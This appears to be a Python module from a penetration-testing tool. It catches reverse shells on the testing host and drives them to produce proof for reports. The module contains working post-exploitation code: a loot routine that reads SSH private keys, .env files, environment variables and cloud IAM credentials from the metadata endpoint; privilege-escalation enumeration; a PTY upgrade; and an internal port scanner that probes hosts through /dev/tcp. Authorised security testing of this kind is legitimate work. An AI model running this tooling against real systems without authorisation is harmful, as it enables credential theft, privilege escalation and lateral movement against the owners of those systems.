"""Host-side reverse-shell listener + session registry — demonstrate RCE impact.

The probes confirm an RCE-class bug; this catches the shell it yields and drives
it, so a report shows ``id`` / ``whoami`` / a read secret instead of just
"RCE confirmed". A pure-stdlib TCP listener binds a port on the box running
Strix; a per-connection reader thread buffers output; tools write commands and
drain output. No sandbox dependency, so it is testable over loopback.

# ponytail: raw TCP by default. Line-oriented shells (bash -i, nc) work;
# full-screen TUIs (vim, top) don't. upgrade_pty is a best-effort python
# spawn; if the target lacks python the session stays a line shell.
"""

from __future__ import annotations

import contextlib
import socket
import threading
import time
import uuid
from dataclasses import dataclass, field


_lock = threading.RLock()
_listeners: dict[int, _Listener] = {}
_sessions: dict[str, _Session] = {}


@dataclass
class _Session:
    id: str
    sock: socket.socket
    addr: str
    port: int
    connected_at: float
    buf: bytearray = field(default_factory=bytearray)
    alive: bool = True
    _buf_lock: threading.Lock = field(default_factory=threading.Lock)

    def _read_loop(self) -> None:
        try:
            while self.alive:
                data = self.sock.recv(8192)
                if not data:
                    break
                with self._buf_lock:
                    self.buf.extend(data)
        except OSError:
            pass
        finally:
            self.alive = False

    def drain(self) -> str:
        with self._buf_lock:
            out = self.buf.decode("utf-8", errors="replace")
            self.buf.clear()
        return out

    def send(self, data: str) -> None:
        self.sock.sendall(data.encode("utf-8"))

    def close(self) -> None:
        self.alive = False
        with contextlib.suppress(OSError):
            self.sock.close()


@dataclass
class _Listener:
    port: int
    server: socket.socket
    alive: bool = True

    def _accept_loop(self) -> None:
        while self.alive:
            try:
                conn, addr = self.server.accept()
            except OSError:
                break
            sess = _Session(
                id=uuid.uuid4().hex[:8],
                sock=conn,
                addr=f"{addr[0]}:{addr[1]}",
                port=self.port,
                connected_at=time.time(),
            )
            with _lock:
                _sessions[sess.id] = sess
            threading.Thread(target=sess._read_loop, daemon=True).start()

    def close(self) -> None:
        self.alive = False
        with contextlib.suppress(OSError):
            self.server.close()


def start_listener(port: int, bind_host: str = "0.0.0.0") -> dict[str, object]:
    with _lock:
        if port in _listeners and _listeners[port].alive:
            return {"success": True, "port": port, "note": "listener already running"}
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((bind_host, port))
        server.listen(8)
    except OSError as e:
        return {"success": False, "error": f"cannot bind {bind_host}:{port}: {e}"}
    listener = _Listener(port=port, server=server)
    threading.Thread(target=listener._accept_loop, daemon=True).start()
    with _lock:
        _listeners[port] = listener
    return {"success": True, "port": port, "bind_host": bind_host}


def list_shells() -> list[dict[str, object]]:
    with _lock:
        out = []
        for s in _sessions.values():
            with s._buf_lock:
                pending = len(s.buf)
            out.append(
                {
                    "session_id": s.id,
                    "remote": s.addr,
                    "listener_port": s.port,
                    "alive": s.alive,
                    "pending_bytes": pending,
                    "age_s": round(time.time() - s.connected_at, 1),
                }
            )
        return out


def read_shell(session_id: str, timeout: float = 2.0) -> dict[str, object]:
    sess = _sessions.get(session_id)
    if sess is None:
        return {"success": False, "error": f"no session {session_id}"}
    deadline = time.time() + max(0.0, timeout)
    # Poll until some output is buffered or the wait elapses (output arrives async).
    while time.time() < deadline:
        with sess._buf_lock:
            if sess.buf:
                break
        if not sess.alive:
            break
        time.sleep(0.1)
    return {"success": True, "session_id": session_id, "output": sess.drain(), "alive": sess.alive}


def shell_exec(session_id: str, command: str, read_timeout: float = 3.0) -> dict[str, object]:
    sess = _sessions.get(session_id)
    if sess is None:
        return {"success": False, "error": f"no session {session_id}"}
    if not sess.alive:
        return {"success": False, "error": f"session {session_id} is dead"}
    sess.drain()  # clear stale banner/prompt so output maps to this command
    # Sentinel echoed after the command marks exactly when it finished, instead
    # of guessing from output-idle timing. Split so the echoed command line
    # (…$((6*7))) differs from the printed token (…42): a shell that echoes its
    # input back can't be mistaken for the command completing.
    marker = "__STRX" + uuid.uuid4().hex[:8]
    done = marker + "42"
    try:
        sess.send(f"{command.rstrip('\n')}; echo {marker}$((6*7))\n")
    except OSError as e:
        sess.alive = False
        return {"success": False, "error": f"send failed: {e}"}
    # Read until the sentinel appears (command done) or read_timeout elapses
    # (fallback for a raw pipe with no shell to echo the sentinel back).
    deadline = time.time() + max(0.5, read_timeout)
    out = ""
    while time.time() < deadline:
        out += sess.drain()
        idx = out.find(done)
        if idx != -1:
            out = out[:idx]  # drop the sentinel line and any trailing prompt
            break
        if not sess.alive:
            break
        time.sleep(0.1)
    return {
        "success": True,
        "session_id": session_id,
        "command": command,
        "output": out.rstrip("\n"),
    }


def close_shell(session_id: str | None = None, port: int | None = None) -> dict[str, object]:
    with _lock:
        if session_id is not None:
            sess = _sessions.pop(session_id, None)
            if sess is None:
                return {"success": False, "error": f"no session {session_id}"}
            sess.close()
            return {"success": True, "closed": session_id}
        if port is not None:
            listener = _listeners.pop(port, None)
            if listener is None:
                return {"success": False, "error": f"no listener on {port}"}
            listener.close()
            for sid in [s.id for s in _sessions.values() if s.port == port]:
                _sessions.pop(sid).close()
            return {"success": True, "closed_listener": port}
    return {"success": False, "error": "pass session_id or port"}


# --- post-exploitation helpers: turn a raw shell into report-ready proof ---

_LOOT_CAP = 2000

# (label, command). Best-effort proof/loot — each runs through shell_exec; a
# blank result just means the file/command wasn't there.
_LOOT_COMMANDS: tuple[tuple[str, str], ...] = (
    ("whoami", "whoami"),
    ("id", "id"),
    ("hostname", "hostname"),
    ("uname", "uname -a"),
    ("passwd", "head -40 /etc/passwd"),
    ("sudo", "sudo -n -l 2>/dev/null"),
    ("env", "env"),
    ("ssh_dir", "ls -la ~/.ssh 2>/dev/null"),
    ("ssh_key", "cat ~/.ssh/id_rsa 2>/dev/null"),
    ("dotenv", "cat .env 2>/dev/null; cat ../.env 2>/dev/null"),
    (
        "cloud_creds",
        "curl -s --max-time 3 http://169.254.169.254/latest/meta-data/iam/"
        "security-credentials/ 2>/dev/null || wget -qO- --timeout=3 "
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null",
    ),
)
# Labels whose non-empty output is inherently sensitive (worth surfacing).
_HIGH_VALUE = frozenset({"ssh_key", "dotenv", "cloud_creds", "sudo"})

_PRIVESC_COMMANDS: tuple[tuple[str, str], ...] = (
    ("sudo", "sudo -n -l 2>/dev/null"),
    ("suid", "find / -perm -4000 -type f 2>/dev/null | head -50"),
    ("caps", "getcap -r / 2>/dev/null | head -30"),
    ("cron", "ls -la /etc/cron* 2>/dev/null"),
    ("world_writable", "find / -perm -0002 -type d 2>/dev/null | head -30"),
    ("kernel", "uname -a; cat /etc/os-release 2>/dev/null | head -3"),
)
_DEFAULT_PIVOT_PORTS = (22, 80, 443, 445, 3306, 5432, 6379, 8080, 9200, 27017)
_PIVOT_MAX = 200
# Printed via `echo OPEN$((40+2))` so a shell that echoes the command isn't a hit.
_PIVOT_OPEN = "OPEN42"


def _safe_host(host: str) -> bool:
    return bool(host) and len(host) <= 253 and all(c.isalnum() or c in ".-:" for c in host)


def upgrade_pty(session_id: str) -> dict[str, object]:
    """Best-effort PTY upgrade so sudo/interactive commands behave.

    Depends on the target having python; falls back, leaving the raw shell usable.
    """
    if _sessions.get(session_id) is None:
        return {"success": False, "error": f"no session {session_id}"}
    cmd = (
        "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || "
        "python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null; export TERM=xterm"
    )
    out = shell_exec(session_id, cmd, read_timeout=3.0)
    if not out.get("success"):
        return out
    return {
        "success": True,
        "session_id": session_id,
        "output": out.get("output", ""),
        "note": "PTY spawn attempted — if the target lacks python it stays a raw line shell",
    }


def _run_labeled(session_id: str, commands: tuple[tuple[str, str], ...]) -> dict[str, str] | None:
    if _sessions.get(session_id) is None:
        return None
    results: dict[str, str] = {}
    for label, cmd in commands:
        resp = shell_exec(session_id, cmd, read_timeout=4.0)
        if not resp.get("success"):
            break
        results[label] = str(resp.get("output", ""))[:_LOOT_CAP]
    return results


def loot(session_id: str) -> dict[str, object]:
    """Grab proof/loot from a caught shell — creds, keys, identity, cloud creds."""
    results = _run_labeled(session_id, _LOOT_COMMANDS)
    if results is None:
        return {"success": False, "error": f"no session {session_id}"}
    high_value = sorted(label for label in _HIGH_VALUE if results.get(label, "").strip())
    return {"success": True, "session_id": session_id, "loot": results, "high_value": high_value}


def privesc_scan(session_id: str) -> dict[str, object]:
    """Quick local privesc enumeration (SUID, sudo, caps, cron, kernel)."""
    checks = _run_labeled(session_id, _PRIVESC_COMMANDS)
    if checks is None:
        return {"success": False, "error": f"no session {session_id}"}
    notable: list[str] = []
    if checks.get("sudo", "").strip():
        notable.append("sudo: non-empty `sudo -l` — check for exploitable entries")
    if checks.get("suid", "").strip():
        notable.append("suid: SUID binaries present — check GTFOBins")
    if checks.get("caps", "").strip():
        notable.append("caps: file capabilities set — check for cap_setuid etc.")
    return {"success": True, "session_id": session_id, "checks": checks, "notable": notable}


def pivot_scan(
    session_id: str, targets: list[str], ports: list[int] | None = None
) -> dict[str, object]:
    """From inside the shell, TCP-connect-test host:port pairs (internal pivot)."""
    if _sessions.get(session_id) is None:
        return {"success": False, "error": f"no session {session_id}"}
    hosts = [h for h in targets if _safe_host(h)]
    if not hosts:
        return {"success": False, "error": "targets is required (hostnames/IPs, no metacharacters)"}
    raw_ports = list(ports) if ports else list(_DEFAULT_PIVOT_PORTS)
    port_list = [p for p in raw_ports if isinstance(p, int) and 1 <= p <= 65535]
    if not port_list:
        return {"success": False, "error": "ports must be integers 1-65535"}
    pairs = [(h, p) for h in hosts for p in port_list][:_PIVOT_MAX]
    open_ports: list[dict[str, object]] = []
    for host, port in pairs:
        cmd = f"timeout 1 bash -c 'echo > /dev/tcp/{host}/{port}' 2>/dev/null && echo OPEN$((40+2))"
        resp = shell_exec(session_id, cmd, read_timeout=2.0)
        if not resp.get("success"):
            break
        if _PIVOT_OPEN in str(resp.get("output", "")):
            open_ports.append({"host": host, "port": port})
    return {
        "success": True,
        "session_id": session_id,
        "open": open_ports,
        "tested": len(pairs),
    }
